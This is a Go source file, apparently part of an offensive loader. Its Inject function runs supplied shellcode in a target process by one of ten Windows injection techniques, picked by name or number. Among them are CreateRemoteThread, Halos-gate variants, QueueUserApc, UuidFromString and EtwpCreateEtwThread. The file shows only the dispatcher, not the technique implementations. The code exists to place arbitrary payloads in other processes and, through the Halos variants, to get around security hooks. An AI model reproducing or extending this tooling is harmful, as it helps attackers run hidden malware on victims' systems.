package core

import (
	"errors"
	"strings"
)

var techniques []string = []string{"CreateRemoteThread", "CreateRemoteThreadHalos", "CreateProcess", "EnumSystemLocales", "EnumSystemLocalesHalos", "Fibers", "QueueUserApc", "UuidFromString", "EtwpCreateEtwThread", "RtlCreateUserThread", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}

func Inject(shellcode []byte, technique string, pid int) error {

	// Check especified injection technique
	if (strings.ToLower(technique) == "createremotethread") || (strings.ToLower(technique) == "1") {
		err := CreateRemoteThread(shellcode, pid)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "createremotethreadhalos") || (strings.ToLower(technique) == "2") {
		err := CreateRemoteThreadHalos(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "createprocess") || (strings.ToLower(technique) == "3") {
		err := CreateProcess(shellcode, pid)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "enumsystemlocales") || (strings.ToLower(technique) == "4") {
		err := EnumSystemLocales(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "enumsystemlocaleshalos") || (strings.ToLower(technique) == "5") {
		err := EnumSystemLocalesHalos(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "fibers") || (strings.ToLower(technique) == "6") {
		err := Fibers(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "queueuserapc") || (strings.ToLower(technique) == "7") {
		err := QueueUserApc(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "uuidfromstring") || (strings.ToLower(technique) == "8") {
		err := UuidFromString(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "etwpcreateetwthread") || (strings.ToLower(technique) == "9") {
		err := EtwpCreateEtwThread(shellcode)
		if err != nil { // Handle error
			return err
		}

	} else if (strings.ToLower(technique) == "rtlcreateuserthread") || (strings.ToLower(technique) == "10") {
		err := RtlCreateUserThread(shellcode, pid)
		if err != nil {
			return err
		}

	} else {
		return errors.New("invalid shellcode injection technique!")
	}

	return nil
}
